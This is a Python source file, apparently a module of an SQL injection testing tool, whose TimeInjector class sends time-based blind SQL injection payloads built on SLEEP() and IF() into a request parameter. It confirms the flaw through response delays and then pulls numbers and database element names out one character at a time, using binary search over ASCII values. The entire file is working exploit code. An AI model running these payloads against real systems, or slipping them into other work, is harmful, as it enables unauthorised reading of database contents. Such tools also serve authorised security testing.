from core.Analyzer import Analyzer
from core.Requester import Requester
from utils.constants import InjectionContext


class TimeInjector:
    """
    Detects time-based SQL injection vulnerabilities.

    These vulnerabilities are identified by measuring whether an injected
    delay function causes the database to respond significantly slower.
    """

    def __init__(self, requester: Requester, analyzer: Analyzer):
        self.requester = requester
        self.analyzer = analyzer

    def test(
        self, param: str, ctx: InjectionContext, sleep: float = 1.0
    ) -> bool:
        """
        Test for time-based SQL injection.

        Compare a normal request with a request containing a database
        delay function. A significant increase in response time for the
        second request indicates that the injected SQL is being executed.

        Time-based SQL injection does not require a visible difference
        in the response body; the response time itself is the signal.
        """

        r_normal = self.requester.send({param: ctx.prefix + "AND 1=1" + ctx.suffix})

        r_sleep = self.requester.send(
            {param: f"{ctx.prefix}AND SLEEP({sleep}){ctx.suffix}"}
        )

        return self.analyzer.is_delayed(r_normal, r_sleep, sleep)

    def get_number_returned_by_sql(
        self,
        param: str,
        ctx: InjectionContext,
        expression: str,
        high: int,
        sleep: int = 1,
    ) -> int:
        """
        Find the number returned by a SQL query using time-based blind SQLi.

        Binary search is used to reduce the number of requests. Instead of
        comparing response bodies, each request conditionally introduces a
        delay when the tested condition is true.
        """

        # Baseline request containing a condition that does not trigger a delay.
        r_baseline = self.requester.send(
            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
        )

        low = 0

        while low < high:
            # Integer division gives the midpoint of the current search range.
            mid = (low + high) // 2

            # If expression > mid is true, the database sleeps.
            payload = (
                f"{ctx.prefix}AND IF({expression}>{mid},SLEEP({sleep}),0){ctx.suffix}"
            )

            response = self.requester.send({param: payload})

            # A significant increase in response time means that
            # expression > mid evaluated to true.
            if self.analyzer.is_delayed(r_baseline, response, sleep):
                low = mid + 1
            else:
                high = mid

        return low

    def get_db_elem_name(
        self,
        param: str,
        ctx: InjectionContext,
        expression: str,
        expr_name_len: int,
        sleep: int = 1,
    ) -> str:
        """
        Return a database element's name using time-based blind SQLi.

        Each character is found with binary search over the printable ASCII
        range. A database delay is used to determine whether the tested
        ASCII value is greater than the current midpoint.
        """

        expr_name = ""

        # Non-delaying baseline. The condition is always false, so SLEEP()
        # is never executed.
        r_baseline = self.requester.send(
            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
        )

        for digit in range(1, expr_name_len + 1):
            # Printable ASCII characters: SPACE (32) through TILDE (126).
            low = 32
            high = 126

            while low < high:
                mid = (low + high) // 2

                # If the character at this position has an ASCII value
                # greater than mid, the database introduces a delay.
                payload = (
                    f"{ctx.prefix}"
                    f"AND IF("
                    f"ASCII(SUBSTRING({expression},{digit},1))>{mid},"
                    f"SLEEP({sleep}),0)"
                    f"{ctx.suffix}"
                )

                response = self.requester.send({param: payload})

                # Delayed response => tested condition is true.
                if self.analyzer.is_delayed(r_baseline, response, sleep):
                    low = mid + 1
                else:
                    high = mid

            expr_name += chr(low)

        return expr_name

    def get_db_elem_name_chars_at_index(
        self,
        param: str,
        ctx: InjectionContext,
        expression: str,
        range: list[int],
        sleep: int = 1,
    ) -> list[str]:
        """
        Return characters at the specified indexes using time-based blind SQLi.

        For each requested character position, binary search is performed
        over printable ASCII values. The response time indicates whether
        the tested ASCII comparison is true or false.
        """

        found_chars: list[str] = []

        # Non-delaying baseline used for timing comparisons.
        r_baseline = self.requester.send(
            {param: f"{ctx.prefix}AND IF(1=2,SLEEP({sleep}),0){ctx.suffix}"}
        )

        for digit in range:
            # Printable ASCII range: SPACE (32) to TILDE (126).
            low = 32
            high = 126

            while low < high:
                mid = (low + high) // 2

                # Trigger the delay only when the character's ASCII value
                # is greater than the midpoint.
                payload = (
                    f"{ctx.prefix}"
                    f"AND IF("
                    f"ASCII(SUBSTRING({expression},{digit},1))>{mid},"
                    f"SLEEP({sleep}),0)"
                    f"{ctx.suffix}"
                )

                response = self.requester.send({param: payload})

                # A delayed response means the condition evaluated to true.
                if self.analyzer.is_delayed(r_baseline, response, sleep):
                    low = mid + 1
                else:
                    high = mid

            found_chars.append(chr(low))

        return found_chars
